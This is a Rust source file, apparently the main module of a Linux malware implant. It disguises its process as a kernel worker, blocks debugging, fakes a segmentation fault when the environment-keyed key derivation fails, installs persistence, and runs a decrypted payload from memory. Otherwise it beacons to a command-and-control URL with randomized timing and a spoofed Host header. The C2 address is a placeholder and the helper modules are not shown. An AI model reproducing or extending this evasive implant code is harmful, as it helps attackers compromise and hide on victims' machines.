mod crypto;
mod persistence;
mod anti_forensics;
mod storage;

use std::thread;
use std::time::Duration;
use rand::Rng;
use rand::distributions::{Distribution, Exp};
use obfstr::obfstr;

const C2_URL: &str = "https://youtube.com/watch?v=dQw4w9WgXcQ"; 
const USER_AGENT: &str = "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0";

fn main() {
    // 1. Anti-Forensics Init
    anti_forensics::mask_process(obfstr!("[kworker/u4:0]"));
    let _ = anti_forensics::prevent_swap();
    anti_forensics::anti_ptrace();
    anti_forensics::install_crash_handler();

    // 2. Environmental Keying
    let key_bytes = match crypto::derive_env_key() {
        Ok(k) => k,
        Err(_) => {
            eprintln!("Segmentation fault (core dumped)");
            std::process::exit(139);
        }
    };

    // 3. Split Key
    let split_key = crypto::SplitKey::new(key_bytes);
    
    // 4. Persistence
    if let Ok(exe_path) = std::env::current_exe() {
        let _ = persistence::install_persistence(&exe_path);
    }

    // 5. Storage / Payload
    let storage_path = storage::get_storage_path().unwrap();
  let blob = if storage_path.exists() {
        storage::read_blob(&storage_path).unwrap_or_default()
    } else {
        Vec::new() 
    };

    if blob.is_empty() {
        beacon_loop(&split_key);
    } else {
        let core_data = split_key.use_key(|k| {
            crypto::decrypt_data(&blob, k)
        });

        match core_data {
            Ok(data) => {
                let _ = persistence::memfd_exec("kworker/u4:0", &data, &[]);
            },
            Err(_) => {
                std::process::exit(139);
            }
        }
    }
}

fn beacon_loop(key: &crypto::SplitKey) {
    let client = reqwest::blocking::Client::builder()
        .user_agent(USER_AGENT)
        .http3_prior_knowledge()
        .build()
        .unwrap();

    let mut rng = rand::thread_rng();

  loop {
        // Jitter: Poisson Distribution
        let exp = Exp::new(1.0 / 600.0).unwrap(); 
        let sleep_secs = exp.sample(&mut rng).max(60.0);
        
        thread::sleep(Duration::from_secs_f64(sleep_secs));

        let beacon_data = b"HEARTBEAT";
        
        let encrypted_payload = key.use_key(|k| {
            crypto::encrypt_data(beacon_data, k)
        });

        if let Ok(payload) = encrypted_payload {
            let _ = client.post(C2_URL)
                .header("Host", "www.google.com")
                .body(payload)
                .send();
        }
    }
}
